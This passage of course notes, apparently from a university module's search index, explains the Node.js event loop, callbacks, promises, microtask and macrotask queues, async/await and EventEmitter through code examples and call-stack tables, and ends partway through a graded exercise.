\u2502\n\u2502  \u2502           poll            \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2524  connections, \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502   data, etc.  \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2502  \u2502           check           \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2514\u2500\u2500\u2524      close callbacks      \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <ol> <li>timers: this phase executes callbacks scheduled by setTimeout() and setInterval().</li> <li>pending callbacks: executes I/O callbacks deferred to the next loop iteration.</li> <li>idle, prepare: only used internally.</li> <li>poll: retrieve new I/O events; execute I/O related callbacks (almost all with the exception of close callbacks, the ones scheduled by timers, and setImmediate()); node will block here when appropriate.</li> <li>check: setImmediate() callbacks are invoked here.</li> <li>close callbacks: some close callbacks, e.g. socket.on('close', ...).</li> </ol> <p>Between each run of the event loop, Node.js checks if it is waiting for any asynchronous I/O or timers and shuts down cleanly if there are not any.</p> <p>Important points to note in this section are:</p> <ol> <li>There are several commonly used APIs that allow NodeJS to execute instructions asynchronously such as <code>setTimeout()</code>, <code>setInterval()</code>, <code>setImmediate()</code>, and I/O related tasks (for example, <code>fs.writeFile()</code>, HTTP Request and Response, or <code>fetch()</code> )</li> <li>The JS in browser's callback queue that we know before is called macrotask queue in nodeJS runtime. Except <code>fetch()</code>, all the APIs mentioned in the previous points enqueue callbacks into macrotask.</li> <li>Another type of callback queue are called microtask. Microtask has a higher priority than macrotask, meaning that all existing microtasks will be cleared before event-loop dequeue the next macrotask.</li> <li>Callbacks that are enqueued into microtask are <code>resolve()</code> or <code>reject()</code> functions from <code>promise</code> and API <code>queueMicrotask()</code>.</li> <li>Now we will discuss I/O APIs callbacks (the 2<sup>nd</sup> Phase, and 4<sup>th</sup> Phase), <code>fetch()</code>, and <code>promise</code> in the next sections. You can explore the other APIs on your own.</li> </ol>"},{"location":"notes/l1_2_nodejs/#io-asynchronous-callbacks-in-nodejs","title":"I/O Asynchronous Callbacks in NodeJS","text":"<p>Let's consider an example of using network I/O,</p> <pre><code>import XMLHttpRequest from \"xhr2\";\nvar xhr = new XMLHttpRequest();\nvar args = process.argv;\nif (args.length == 3) {\n  var input = args[2];\n  xhr.onreadystatechange = function () {\n    if (xhr.readyState == 4) {\n      var res = xhr.responseText;\n      console.log(res);\n    }\n  };\n  xhr.open(\"GET\", `https://postman-echo.com/get?x=${input}`);\n  xhr.send();\n} else {\n  console.log(\"USAGE: node index.js input\");\n}\n</code></pre> <p>Explanation:</p> <ul> <li>The first statement, we import the <code>XMLHttpRequest</code> class from the package <code>xhr2</code>. (We don't need to import it when the code is executed in the browser as all browser has <code>XMLHttpRequest</code> class builtin in the run-time, but this is not the case for node.js).</li> <li>In the second statement, we instantiate an <code>XMLHttpRequest</code> request object.</li> <li>In the third line, we read the command line arguments into a variable <code>args</code>. Remember that we can pass the argument when executing the file. For example, if the filename is <code>index.js</code>, then we can execute <code>node index.js abcd</code> in the terminal. In this example, <code>abcd</code> is the command line argument.</li> <li>The following <code>if-else</code> statement checks whether the user supplies an argument. The <code>node</code> and <code>index.js</code> are counted, so the length must be 3.</li> <li>In the <code>if</code> body, we extract the third argument, which will be used as the input parameters in the API call.</li> <li>Before calling the API, we set-up a callback in the event of the HTTP Request state is changed. As we discussed earlier, the node.js run-time has an event loop, which periodically checks for events (Phase 4). In this case, the change of state in the <code>XMLHttpRequest</code> object is one of the events it is checking. When the event occurs, i.e. the state of the object changes, the callback function will be placed in the callback queue. When the main call stack is empty, the callback will be put into the call stack for execution. Read about <code>.onreadystatechange</code> here and <code>readyState</code> property here. Basically, HTTP request has several states, and the last state is state 4 (DONE) which means that the data transfer has been completed (response received) or failed.</li> <li>In the callback function, we check whether the state is <code>4</code>, which stands for <code>DONE</code>. When the call is done, we extract the response text and print it out.</li> <li> <p>After setting up the callback function, we <code>open</code> the request and submit it. In this example, we send a request to postman-echo which allows us to test sending a request as a client. The API will return a JSON response.</p> </li> <li> <p>If we execute this script, we will observe the API request's response being printed on the command line.</p> </li> </ul> <p>Next let's consider another example that interacts with file system via the <code>node:fs</code> library (which is a builtin module).</p> <pre><code>import { writeFile } from \"node:fs\";\nconst txt = \"hello\";\nwriteFile(\"save.txt\", txt, (err) =&gt; {\n  if (err) throw err;\n  console.log(\"The file has been saved!\");\n});\n</code></pre> <p>Explanation:</p> <ul> <li>At line 2, we define the text data to be written to the file.</li> <li>At line 3, we write the result to a file named <code>save.txt</code>, note that <code>writeFile()</code> takes three arguments. The last argument is a callback function, whose argument <code>err</code> is potentially an error. In this case, when the error is present, we propagate the error by throwing it as an exception, otherwise, we print a message.</li> </ul>"},{"location":"notes/l1_2_nodejs/#callback-pyramid","title":"Callback Pyramid","text":"<p>Let's say now we would like to combine the two examples, first we would like to make an API call, when the call is returned successfully, we save the result of the API call into a file.</p> <pre><code>import XMLHttpRequest from \"xhr2\";\nimport { writeFile } from \"node:fs\";\n\nvar xhr = new XMLHttpRequest();\nvar args = process.argv;\nif (args.length &gt; 2) {\n  var input = args[2];\n  xhr.onreadystatechange = function () {\n    if (xhr.readyState == 4) {\n      var res = xhr.responseText;\n      writeFile(\"api_result.txt\", res, (err) =&gt; {\n        if (err) throw err;\n        console.log(\"The file has been saved!\");\n      });\n    }\n  };\n  xhr.open(\"GET\", `https://postman-echo.com/get?x=${input}`);\n  xhr.send();\n} else {\n  console.log(\"USAGE: node index.js input\");\n}\n</code></pre> <p>Note that we have to \"embed\" the routine of writing the result <code>res</code> into a file <code>api_result.txt</code> deep inside the callback of <code>xhr</code> request, the <code>writeFile()</code> call itself has another callback. If we have many asynchronous steps following one another, the code will become complicated and hard to read.</p>"},{"location":"notes/l1_2_nodejs/#promise","title":"Promise","text":"<p>Promise is a builtin class in JavaScript, which allows us to build a sequence of asynchronous tasks without nesting call-backs.</p> <p>A <code>Promise</code> object can be instantiated by passing in a function as argument. This function argument is called the executor. An executor function is a higher order function that takes two functions as arguments, commonly named as <code>resolve</code> and <code>reject</code>. <code>resolve</code> is applied to the result of the promise during normal execution, <code>reject</code> is applied when some error occurs. The function body of executor is executed synchronously while <code>resolve</code> and <code>reject</code> are asynchronous and queued into microtask. Look at the simple <code>Promise</code> example below which is not using <code>reject</code>, but only <code>resolve</code>.</p> <pre><code>// executor is executed synchronously when promise object is initialized with \"new\" keyword.\n// Console will print \"Hello\" when this code below is run\nlet alwaysWork = new Promise(function (resolve, reject) {\n  console.log(\"Hello\");\n  resolve();\n});\n\n// resolve() and reject() functions are the argument passed to .then() or .catch()\nalwaysWork.then(() =&gt; console.log(\"Comes later\"));\n</code></pre> <p>Explanations:</p> <ul> <li><code>function (resolve, reject) { console.log(\"Hello\"); resolve();</code> is the executor.</li> <li>We can think of <code>Promise</code> in JS as this way: \"I want to run a piece of code (everything defined inside executor, synchronously). At the end of the code execution, I will either reach a success or failed state. If success, I would like to execute the <code>resolve()</code> function, otherwise I will execute <code>reject()</code>. I don't know yet what is the <code>resolve()</code> function. It will be provided when a function is passed as an argument to <code>.then()</code>. Same thing for <code>reject()</code>, which depends on function passed to <code>.catch()</code>\".</li> <li>In the example above, we use the anonymous function for <code>resolve()</code>, which is <code>() =&gt; console.log(\"Comes later\")</code>. This function is queued into microtask.</li> <li>However, it is logical that <code>resolve()</code> or <code>reject()</code> can be a code that queues task to macrotask (e.g. you can have <code>setTimeout()</code> inside the function argument for <code>.then()</code>)</li> </ul> <p>Let's consider a more complicated example using <code>Promise</code>.</p> <pre><code>function asyncCounter() {\n  var count = 0;\n  return new Promise((resolve, reject) =&gt; {\n    resolve(count);\n  });\n}\n\nfunction incr(count) {\n  console.log(count);\n  return new Promise((resolve, reject) =&gt; {\n    resolve(++count);\n  });\n}\n\nlet counter = asyncCounter();\n\ncounter.then(incr).then(incr).then(incr);\n</code></pre> <p>Explanation:</p> <ul> <li>In the above we instantiate an asynchronous counter by calling the function <code>asyncCounter()</code>, which initializes a local variable <code>count</code> and return a promise object that immediately <code>resolve</code> with the variable.</li> <li>Do you notice that we use closure here?</li> <li>Next we invoke <code>.then</code> method of this counter (promise) three times. We can chain the invocation because, <code>.then</code> method takes a method and returns a new promise. In this case, we use the <code>incr</code> function as the argument of <code>.then</code>. In the <code>incr</code> function, we print the <code>count</code> variable and return the new promise while incrementing <code>count</code> by 1.</li> <li>Fun-but-important fact: you can simply write the return statement of <code>incr()</code> function as <code>return ++count;</code>. JavaScript intrisically turn the returned value as a promise object resolved with returned value. We use this approach sometimes in the notes.</li> </ul> <p>When we execute the above we will see the following printed on the terminal.</p> <pre><code>0\n1\n2\n</code></pre> <p>Now let's make some changes so that the we will stop incrementing the counter when a limit is reached. We modify the <code>incr()</code> function as follows,</p> <pre><code>// definition of asyncCounter() remains unchanged.\nfunction incr(count) {\n  console.log(count);\n  return new Promise((resolve, reject) =&gt; {\n    if (count &gt; 1) {\n      reject(\"limit reached\");\n    } else {\n      resolve(++count);\n    }\n  });\n}\n</code></pre> <p>In the above, <code>incr</code> returns a new promise object which does not always resolve with <code>++count</code>. In the event that the current <code>count</code> value is greater than 1, it will reject the rest of the computation, by applying <code>reject</code>.</p> <p>Now coming back to the use of the <code>counter</code>, we chain it with <code>incr</code> 4 times, followed by a call to a <code>catch()</code> method invocation and consumes the error raised by any of the <code>reject</code> function call.</p> <pre><code>let counter = asyncCounter();\n\ncounter\n  .then(incr)\n  .then(incr)\n  .then(incr)\n  .then(incr)\n  .catch((reason) =&gt; console.log(`rejected: ${reason}.`));\n</code></pre> <p>calling the above, we have</p> <pre><code>0\n1\n2\nrejected: limit reached.\n</code></pre> <p>You might argue that we don't experience any asynchronousness here.</p> <p>Let's modify the example by attaching a prefix to the message printed by the <code>incr</code> function and creating a second counter.</p> <pre><code>function asyncCounter() {\n  var count = 0;\n  return new Promise((resolve, reject) =&gt; {\n    resolve(count);\n  });\n}\n\nfunction incr(id) {\n  return function (count) {\n    console.log(`${id}:${count}`);\n    return new Promise((resolve, reject) =&gt; {\n      if (count &gt; 1) {\n        reject(\"limit reached\");\n      } else {\n        resolve(++count);\n      }\n    });\n  };\n}\n\nlet counter1 = asyncCounter();\n\ncounter1\n  .then(incr(\"c1\"))\n  .then(incr(\"c1\"))\n  .then(incr(\"c1\"))\n  .catch((reason) =&gt; console.log(`rejected: ${reason}.`));\n\nlet counter2 = asyncCounter();\n\ncounter2\n  .then(incr(\"c2\"))\n  .then(incr(\"c2\"))\n  .then(incr(\"c2\"))\n  .catch((reason) =&gt; console.log(`rejected: ${reason}.`));\n\nsetImmediate(() =&gt; console.log(\"tick!\"));\nconsole.log(\"main done!\");\n</code></pre> <p>In the 2<sup>nd</sup> last statement, we call <code>setImmediate</code> which prints a <code>tick!</code> message at the next event loop cycle. Note that <code>setImmediate()</code> queue the callback to macrotask. When executing the above example, we observe</p> <pre><code>main done!\nc1:0\nc2:0\nc1:1\nc2:1\nc1:2\nc2:2\nrejected: limit reached.\nrejected: limit reached.\ntick!\n</code></pre> <p>It reveals that the execution of the <code>incr</code> method calls for both promise objects are interleaved. The <code>tick</code> message shows that all these happens in one single event loop cycle because all the microtask from <code>promise</code> are executed before dequeueing macro task from the <code>setImmediate()</code>. We will discuss what happen behind the scene in the next section.</p>"},{"location":"notes/l1_2_nodejs/#nodejs-run-time-model","title":"Node.js run-time model","text":""},{"location":"notes/l1_2_nodejs/#browser-vs-nodejs-runtime-revisit","title":"Browser vs NodeJS runtime (revisit)","text":"<p>Recall from the previous class, we studied the JavaScript run-time in the browser, which has a call stack, a heap, an event registry and a callback queue.</p> <ol> <li>The run-time executes the JavaScript main program in the call stack until no more stack frame left, and goes into the event loop.</li> <li>When there is an event triggered, the callback function associated with the event (in the event registery) will be added to the callback queue.</li> <li>In an event loop cycle, when there is no more frame in the call stack but there is some item in the call back queue, the run-time will dequeue the callback from the queue and add it to the call stack.</li> </ol> <p>In node.js runtime model, there are two callback queues:</p> <ol> <li>The macro task queue, which is same as the callback queue that stores callback associated with events.</li> <li>The micro task queue, which stores callbacks associated with promises.</li> </ol> <p>Given that promises are special builtin of node.js run-time, they are treated \"differently\" when executed. When a promise is instantiated, its executor function is executed upto the <code>resolve(...)</code> (or <code>reject(...)</code>) statement. The call of <code>resolve(...)</code> (or <code>reject(...)</code>) is enqueued into the microtask queue. In an event loop cycle, when the call stack is empty, the run-time checks whether the microtask queue contains any item before checking the macrotask queue.</p>"},{"location":"notes/l1_2_nodejs/#callstack-callback-queue-analysis-of-code-execution-in-nodejs","title":"Callstack &amp; Callback Queue Analysis of code execution in Node.js","text":"<p>We illustrate the execution of the last example in the following table, for simplicity, we omit the event registry table, and the macrotask queue. We are interested in the program counter, the call stack, the microtask queue, and the list of promises. We also paste the code here with line numbers to help us in the analysis.</p> <pre><code>1: function asyncCounter()  {\n2:     var count = 0;\n3:     return new Promise( (resolve, reject) =&gt; {\n4:         resolve(count);\n5:     });\n6: }\n7:\n8: function incr(id) {\n9:     return function (count) {\n10:        console.log(`${id}:${count}`);\n11:        return new Promise((resolve, reject) =&gt; {\n12:            if (count &gt; 1) {\n13:                reject(\"limit reached\");\n14:            } else {\n15:                resolve(++count);\n16:            }\n17:        });\n18:    };\n19:}\n20:\n21: let counter1 = asyncCounter();\n22:\n23: counter1\n24:    .then( incr(\"c1\") )\n25:    .then( incr(\"c1\") )\n26:    .then( incr(\"c1\") )\n27:    .catch( (reason) =&gt; console.log(`rejected: ${reason}.`))\n28:\n29: let counter2 = asyncCounter();\n30:\n31: counter2\n32:    .then( incr(\"c2\") )\n33:    .then( incr(\"c2\") )\n34:    .then( incr(\"c2\") )\n35:    .catch( (reason) =&gt; console.log(`rejected: ${reason}.`))\n36:\n37: // setImmediate(() =&gt; console.log(\"tick!\"));\n38: console.log(\"main done!\")\n</code></pre> line num call stack micro queue promises 21 [main] [] {} 1 [main, asyncCounter] [] {} 3 [main, asyncCounter] [] {promise@21} 23 [main] [] {promise@21} 8-9 [main, incr] [promise@21.resolve(0)=incr(\"c1\")(0) ] {promise@21} 23 [main] [promise@21.resolve(0)=incr(\"c1\")(0) ] {promise@21} <p>In the above we show the execution of the program from line 1 to line 27.</p> <ol> <li>Line 1 defines function <code>aysncCounter</code></li> <li>Line 8 defines function <code>incr</code>.</li> <li>Line 21, <code>asyncCounter()</code> is invoked, the program counter moves back to line 2 then line 3,</li> <li>Line 3, a promise object <code>promise@21</code> is instantiated, its body is executed upto the call to <code>resolve</code>, since at this stage, we are not sure what the <code>resolve</code> function could be. We add <code>promise@21</code> to the set of promises. We added the suffix <code>@21</code> to indicate that the promise object was instantiated and with reference at line 21. This helps us to reason about the execution.</li> <li>Line 23, <code>promise@21</code> is being chained with <code>.then(incr(\"c1\"))</code>, we first move the program pointer back to line 8-9 and compute <code>incr(\"c1\")</code>, which add the function call to call stack</li> <li>Line 9, we return a function, this function will be the <code>resolve</code> function of the <code>promise@21</code> object. One may ask what about the <code>reject</code> function of the same promise object, since in this case the <code>reject</code> is never used, we could omit it. To be precise, we can say that it can be an identity reject function.    <code>js (err) =&gt;  new Promise((resolve, reject) =&gt; reject(err));</code>    We are done with the call <code>incr(\"c1\")</code> and return to the call site Line 24. It is another chain with <code>.then</code>. However the value to be produced here is the result of a task from the microtask queue, which is not executed yet so we skip the rest of the <code>.then()</code>s.    If we continue to execute the rest of the program (ignoring lines 37-38), we will end up with</li> </ol> program counter (line num) call stack micro queue promises 29 [main()] [promise@21.resolve(0)=incr(\"c1\")(0) ] {promise@21} 1 [main(), asyncCounter()] [promise@21.resolve(0)=incr(\"c1\")(0)] {promise@21} 3 [main(), asyncCounter()] [promise@21.resolve(0)=incr(\"c1\")(0)] {promise@21, promise@29} 31 [main()] [promise@21.resolve(0)=incr(\"c1\")(0)] {promise@21, promise@29} 8-9 [main(), incr()] [promise@21.resolve(0)=incr(\"c1\")(0), promise@29.resolve(0)=incr(\"c2\")(0) ] {promise@21, promise@29} 31 [main()] [promise@21.resolve(0)=incr(\"c1\")(0), promise@29.resolve(0)=incr(\"c2\")(0) ] {promise@21, promise@29} eof [] [promise@21.resolve(0)=incr(\"c1\")(0), promise@29.resolve(0)=incr(\"c2\")(0) ] {promise@21, promise@29} <p>At this stage, the call stack is empty, the node.js run-time dequeues the first task from the micro task queue, i.e. <code>promise@21.resolve(0)</code>. <code>incr(\"c1\")(0)</code> prints <code>c1:0</code>, generates a new promise <code>promise@24</code> (because the promise object will be returned to the chaining at line 24).</p> program counter (line num) call stack micro queue promises 9-18 [function@9(0)] [ promise@29.resolve(0)=incr(\"c2\")(0) ] {promise@21, promise@29, promise@24} <p>Since the promise at line 24 become known, the <code>.then(incr(\"c1\"))</code> at line 25 can provide the function to resolve the promise of line 24 and enqueue the function to the micro queue.</p> program counter (line num) call stack micro queue promises 25 [] [ promise@29.resolve(0)=incr(\"c2\")(0), promise@24.resolve(1)=incr(\"c1\")(1) ] {promise@21, promise@29, promise@24} <p>Since the call stack is empty, we dequeue the next item from micro task queue, which is</p> program counter (line num) call stack micro queue promises 9-18 [function@9(0)] [ promise@24.resolve(1)=incr(\"c1\")(1) ] {promise@21, promise@29, promise@24, promise@32} <p>Since the promise at line 32 become known, thanks to the <code>.then(incr(\"c2\"))</code>, we resolve the promise at line 32 and enqueue to the micro queue.</p> program counter (line num) call stack micro queue promises 33 [] [ promise@24.resolve(1)=incr(\"c1\")(1), promise@32.resolve(1)=incr(\"c2\")(1) ] {promise@21, promise@29, promise@24, promise@32} <p>By repeating the similar steps, we get</p> <pre><code>c1:0\nc2:0\nc1:1\nc2:1\nc1:2\nc2:2\nrejected: limit reached.\nrejected: limit reached.\n</code></pre>"},{"location":"notes/l1_2_nodejs/#mixing-callbacks-and-promises","title":"Mixing callbacks and promises","text":"<p>Returning to the earlier example with API call and file write operations, we now can rewrite the example as follows by introducing promises.</p> <pre><code>1: import XMLHttpRequest from 'xhr2';\n2: import { writeFile } from 'node:fs';\n3:\n4: var xhr = new XMLHttpRequest();\n5: var args = process.argv;\n6: if (args.length &gt; 2) {\n7:     var input = args[2];\n8:     let apiPromise = new Promise( (resolve, reject) =&gt; {\n9:         xhr.onreadystatechange = () =&gt; {\n10:            if (xhr.readyState == 4) {\n11:                var res = xhr.responseText;\n12:                resolve(res);\n13:            }\n14:        };\n15:        xhr.open('GET', `https://postman-echo.com/get?x=${input}`);\n16:        xhr.send();\n17:    });\n18:\n19:    function feedResultToFile(result) {\n20:        return new Promise(  (resolve, reject) =&gt; {\n21:            writeFile('api_result.txt', result, (err) =&gt; {\n22:                if (err) {\n23:                    reject(err);\n24:                } else {\n25:                    resolve('The file has been saved!');\n26:                }\n27:            });\n28:        });\n29:    }\n30:    apiPromise\n31:        .then(feedResultToFile)\n32:        .then( (res) =&gt; console.log(res))\n33:        .catch((err) =&gt; console.log(err)) ;\n34:} else {\n35:    console.log(\"USAGE: node api_fs_callback_2nd_attempt input\");\n36:}\n</code></pre> Copy the code without the line number here <pre><code>import XMLHttpRequest from \"xhr2\";\nimport { writeFile } from \"node:fs\";\n\nvar xhr = new XMLHttpRequest();\nvar args = process.argv;\nif (args.length &gt; 2) {\n  var input = args[2];\n  let apiPromise = new Promise((resolve, reject) =&gt; {\n    xhr.onreadystatechange = () =&gt; {\n      if (xhr.readyState == 4) {\n        var res = xhr.responseText;\n        resolve(res);\n      }\n    };\n    xhr.open(\"GET\", `https://postman-echo.com/get?x=${input}`);\n    xhr.send();\n  });\n\n  function feedResultToFile(result) {\n    return new Promise((resolve, reject) =&gt; {\n      writeFile(\"api_result.txt\", result, (err) =&gt; {\n        if (err) {\n          reject(err);\n        } else {\n          resolve(\"The file has been saved!\");\n        }\n      });\n    });\n  }\n  apiPromise\n    .then(feedResultToFile)\n    .then((res) =&gt; console.log(res))\n    .catch((err) =&gt; console.log(err));\n} else {\n  console.log(\"USAGE: node api_fs_callback_2nd_attempt input\");\n}\n</code></pre> <p>First we wrap the API call into a promise, <code>apiPromise</code>, which is chained with a resolve function <code>feedResultToFile</code>, in which we wrap the operation of writing into the a file into another promise. When the above is executed,</p> line num call stack micro queue promises macro queue event reg 8 [main()] [] {promise@8} [] 9 [main()] [] {promise@8} [] {xhr.readystatechange : function@9 } 15,16 [main()] [] {promise@8} [] {xhr.readystatechange : function@9 } 30 [main()] [] {promise@8} [] {xhr.readystatechange : function@9 } eof [] [] {promise@8} [] {xhr.readystatechange : function@9 } <p>When the program counter is at line 8, we instantiate a promise, which is unresolved. At line 9, we register the <code>xhr.headystatechange</code> event with a callback function <code>function@9</code>. At lines 15-16, we are setting up the API calls and send the request, which does not affect the micro nor macro queues. At line 30, though we see a <code>.then()</code> chaining with promise@8, however, promise@8 is not yet resovled until function@9 is called. Hence we skip the rest. At the end of the JavaScript program, the call stack is empty and the microtask queue is also empty. Suppose at this moment, <code>xhr</code>'s <code>readystatechange</code> event is triggered, and <code>function@9</code> will be added to the call stack. Suppose <code>xhr.readyState == 4</code> and the <code>responseText</code> is <code>hello</code>.</p> line num call stack micro queue promises macro queue event reg eof [] [] {promise@8} [function@9] {xhr.readystatechange : function@9} 9 [function@9()] [] {promise@8} [] {xhr.readystatechange : function@9} 11,12 [function@9()] [] {promise@8} [] {xhr.readystatechange : function@9} 31 [] [promise@8.resolve(\"hello\") = feedResultToFile(\"hello\")] {promise@8} [] {xhr.readystatechange : function@9} <p>We put the function@9 to call stack and execute it, which in term resolves <code>promise@8</code>. Then we proceed to line 31 <code>.then(feedResultToFile)</code> as <code>promise@8</code> is resolved, in which <code>promise@8.resolve</code> is enqueued to the microtask queue. When <code>function@9</code> finishes, the run-time will dequeue <code>promise@8.resolve</code> and put <code>feedResultToFile(\"hello\")</code> into the call stack to execute, which generate a promise <code>promise@31</code>. The executor calls <code>writeFile()</code> API which queues a callback into macrotask. Assume that all promise will resolve, we will get the desired behavior.</p> line num call stack micro queue promises macro queue event reg 19 [feedResultToFile(\"hello\")] [] {promise@8} [] {xhr.readystatechange : function@9} 20 [feedResultToFile(\"hello\")] [] {promise@8, promise@31} [] {xhr.readystatechange : function@9} 21 [feedResultToFile(\"hello\")] [] {promise@8, promise@31} [fs.writeFile:function@21] {xhr.readystatechange : function@9} eof [] [] {promise@8, promise@31} [fs.writeFile:function@21] {xhr.readystatechange : function@9} 21 [function@21] [] {promise@8, promise@31} [] {xhr.readystatechange : function@9} 32 [] [promise@31.resolve(res) = (res) =&gt; console.log(res)] {promise@8, promise@31} [] {xhr.readystatechange : function@9} 32 [(res) =&gt; console.log(res)] [] {promise@8, promise@31} [] {xhr.readystatechange : function@9} eof [] [] {promise@8, promise@31} [] {xhr.readystatechange : function@9} <p>In this example, we see how promises (micro tasks) and event callbacks (macro tasks) being executed together. Observe that <code>o.then(f)</code> chaining is pending until the promise object <code>o</code> is resolved, then <code>o.resolve=f</code> is enqeueued into the microtask queue. When the call stack is empty, the run-time tries to look into the microtask queue before checking the macrotask queue.</p>"},{"location":"notes/l1_2_nodejs/#full-of-promises","title":"Full of promises","text":"<p>For ease of use, many node.js libraries provides both callback (lower level) and promise (higher level) APIs, some even provides synchronous APIs. For instance, <code>node:fs</code> library offers all three types of APIs.</p> <p>Unfortunatately, <code>xhr2</code> is one of those that do not provide promise APIs. To rewrite the earlier example using promise API only, we replace <code>xhr2</code> with <code>node-fetch</code>. The fetch() API returns a promise.</p> <pre><code>import fetch from \"node-fetch\";\nimport { promises } from \"node:fs\";\n\nvar args = process.argv;\nif (args.length &gt; 2) {\n  var input = args[2];\n  let apiPromise = fetch(`https://postman-echo.com/get?x=${input}`);\n  apiPromise\n    .then((response) =&gt; response.text())\n    .then((text) =&gt; promises.writeFile(\"api_result.txt\", text))\n    .then((res) =&gt; {\n      console.log(\"The file has been saved!\");\n      return res;\n    })\n    .catch((err) =&gt; console.log(err));\n} else {\n  console.log(\"USAGE: node api_fs_call_back_3rd_attempt input\");\n}\n</code></pre> <p>Some notes to help you understand the code above:</p> <ul> <li><code>response</code> is an HTTP response object as the result of resolved promise of `fetch()</li> <li><code>response.text()</code> actually returns a promise, reading the data streams that resolves with a String. Therefore, <code>text</code> is a String</li> <li><code>fs.writeFile()</code> also returns a promise that resolves with <code>undefined</code>.</li> </ul>"},{"location":"notes/l1_2_nodejs/#nicer-syntax","title":"Nicer syntax","text":"<p>Let <code>p</code> be a promise that eventually produces result <code>r</code>, let <code>(r) =&gt; e</code> be a function that takes <code>r</code> and produces a new promise.</p> <pre><code>p.then((r) =&gt; e);\n</code></pre> <p>can be rewritten</p> <pre><code>let r = await p;\ne;\n</code></pre> <p>The reverse direction also works. In otherwords, we can rewrite our earlier API and file writing example as follows,</p> <pre><code>import fetch from \"node-fetch\";\nimport { promises } from \"node:fs\";\n\nvar args = process.argv;\nif (args.length &gt; 2) {\n  var input = args[2];\n  let response = await fetch(`https://postman-echo.com/get?x=${input}`);\n  let text = await response.text();\n  let res = await promises.writeFile(\"api_result.txt\", text);\n  console.log(\"The file has been saved!\");\n} else {\n  console.log(\"USAGE: node index.js input\");\n}\n</code></pre> <p>which will be translated to the version with <code>.then()</code>.</p> <p>When we want to use <code>await</code> style programming in a function, we should declare the function as <code>async</code>. For instance, if we rewrite the above example, by moving the main routine in to a main function.</p> <pre><code>import fetch from \"node-fetch\";\nimport { promises } from \"node:fs\";\n\nasync function main(args) {\n  if (args.length &gt; 2) {\n    var input = args[2];\n    let response = await fetch(`https://postman-echo.com/get?x=${input}`);\n    let text = await response.text();\n    let res = await promises.writeFile(\"api_result.txt\", text);\n    console.log(\"The file has been saved!\");\n  } else {\n    console.log(\"USAGE: node index.js input\");\n  }\n}\n\nmain(process.argv);\n</code></pre>"},{"location":"notes/l1_2_nodejs/#user-defined-events","title":"User Defined Events","text":"<p>We can define customized events to trigger callbacks in Node.js.</p> <p>For instance</p> <pre><code>import EventEmitter from \"events\";\n\nconst myEvtEmt = new EventEmitter();\n\nmyEvtEmt.on(\"start\", (data) =&gt; {\n  console.log(`data ${data} received`);\n});\n\nmyEvtEmt.emit(\"start\", 1);\n</code></pre> <p>we make use of the <code>EventEmitter</code> class imported from the <code>events</code> library. In the above code, we define an <code>EventEmitter</code> object <code>myEvtEmt</code>. Then we use <code>.on()</code> method to register a customized event <code>start</code> with a callback function, in this case the call back is an anonymous function taking the data and printing it out. In the third statement, we trigger the event by calling <code>.emit()</code> method.</p> <p>In case the callback does not take any parameters, the <code>.emit()</code> will only be called with one argument, i.e. the event.</p> <pre><code>myEvtEmt.on(\"end\", () =&gt; {\n  console.log(`bye`);\n});\n\nmyEvtEmt.emit(\"end\");\n</code></pre>"},{"location":"notes/l1_2_nodejs/#when-will-the-event-loop-stop","title":"When will the event loop stop?","text":"<p>For Node.js, some of the events are expecting a closure (closure as in general term, not JS closure), e.g. API call, file operation, the Node.js event loop will keep looping until all expected closures have returned and there is no more pending tasks in the micro nor the macro queues.</p> <p>For browsers, the event loop will continue as it waits for the user's next input.</p>"},{"location":"notes/l1_2_nodejs/#further-readings","title":"Further Readings","text":"<ul> <li>An interactive example showing how promise and callback works.</li> </ul> <pre><code>https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/\n</code></pre> <ul> <li>Synchronous vs Asynchronous JavaScript \u2013 Call Stack, Promises, and More</li> </ul> <pre><code>https://www.freecodecamp.org/news/synchronous-vs-asynchronous-in-javascript/#:~:text=JavaScript%20is%20a%20single%2Dthreaded,language%20with%20lots%20of%20flexibility.\n</code></pre> <ul> <li>Node.js Event loop behavior</li> </ul> <pre><code>https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick\n</code></pre> <ul> <li>Node.js API for timer functions, <code>setTimeout</code>, <code>setImmediate</code>, <code>setInterval</code>.</li> </ul> <pre><code>https://nodejs.org/en/docs/guides/timers-in-node\n</code></pre>"},{"location":"notes/l1_2_nodejs/#corhort-exercise-graded","title":"Corhort Exercise (Graded)","text":"<p>Using the callstack-microtask-macrotask table, illustrate the execution of the following JavaScript program</p> <pre><code>import EventEmitter from \"events\";\n\nconst ev1 = new EventEmitter();\nconst ev2 = new EventEmitter();\n\nlet count = 0;\n\nlet promise1 = new Promise((resolve, reject) =&gt; {\n  resolve(count);\n});\n\nlet promise2 = new Promise((resolve, reject) =&gt; {\n  resolve(count);\n});\n\nfunction foo(x) {\n  return new Promise((resolve, reject) =&gt; {\n    if (x &gt; 10) {\n      resolve();\n    } else if (x % 2 == 0) {\n      ev1.emit(\"run\", ++x);\n    } else {\n      ev2.emit(\"run\", ++x);\n    }\n  });\n}\n\nev1.on(\"run\", (data) =&gt; {\n  setImmediate(() =&gt; {\n    console.log(`data ${data} received by ev1`);\n    